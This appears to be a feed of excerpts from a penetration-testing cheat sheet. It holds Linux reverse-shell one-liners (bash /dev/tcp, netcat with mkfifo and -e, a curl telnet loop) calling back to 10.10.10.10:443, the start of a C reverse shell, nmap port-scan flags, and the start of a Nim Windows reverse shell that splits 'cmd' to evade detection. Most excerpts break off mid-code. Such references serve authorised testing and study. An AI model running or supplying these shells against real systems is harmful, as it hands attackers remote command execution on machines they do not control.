item.title: Linux
item.description: Reverse link Bash link sh -i >& /dev/tcp/10.10.10.10/443 0>&1 NC link rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 443 >/tmp/f nc 10.10.10.10 443 -e sh nc -c sh 10.10.10.10 443 Curl link C='curl -Ns telnet://10.10.10.10:443'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null C link #include <stdio.h> #include <sys/socket.h> #include <sys/types.h> #include <stdlib.h> #include <unistd.h> #include <netinet/in.h> #include <arpa/inet.h> int main(void){ int port = 443; struct sockaddr_in revsockaddr; int sockt = socket(AF_INET, SOCK_STREAM, 0); revsockaddr.

item.title: Portscan
item.description: Port Specification Options link Switch/Flag Example Description -p nmap -p 21 127.0.0.1 Scanning Specific Port -p nmap -p 21-100 127.0.0.1 Scanning Specific Port Range -sU sudo nmap -sU 110 127.0.0.1 UDP Port Scanning -p- nmap -p- 127.0.0.1 All Port Scanning -F nmap -F 127.0.0.1 Fast mode - Scan fewer ports than the default scan Port Scanning Types link Switch/Flag Example Description -sS nmap -sS 127.0.0.1 TCP SYN Scan -sT nmap -sT 127.

item.title: Windows
item.description: Reverse link Nim link proc exe(c: string): string = result = execProcess("cm" & "d /c " & c) var v = newSocket() # Change this v1 = "10.10.10.10" v2 = "443" s4 = "Exiting.." s5 = "cd" s6 = "C:\\" try: v.connect(v1, Port(parseInt(v2))) while true: v.send(os.getCurrentDir() & "> ") let c = v.recvLine() if c == "exit": v.send(s4) break if c.strip() == s5: os.setCurrentDir(s6) elif c.strip().startswith(s5): let d = c.
